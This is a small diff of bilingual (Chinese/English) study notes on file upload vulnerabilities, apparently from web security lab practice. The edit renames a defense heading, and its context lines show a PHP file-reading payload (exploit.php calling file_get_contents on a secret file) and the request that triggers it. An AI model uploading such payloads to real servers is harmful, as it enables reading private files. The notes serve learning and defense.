@@ -14,7 +14,7 @@
 - upload exploit.php (<"?php echo file_get_contents('/home/carlos/secret'); ?">)
 - GET /files/avatars/exploit.php HTTP/1.1 <br>
 
-## 防禦措施
+## Web server prevent 
 - 檢查此輸入特定的Content-Type標頭是否與預期的 MIME 類型相符
 - Request header:
     - Content-Type:application/x-www-form-url-encoded
@@ -89,3 +89,5 @@
 - Content-Type: application/x-httpd-php
 - Content-Length: 49
 - <"?php echo file_get_contents('/path/to/file'); ?">
+
+## Prevent file upload vulnerabilities
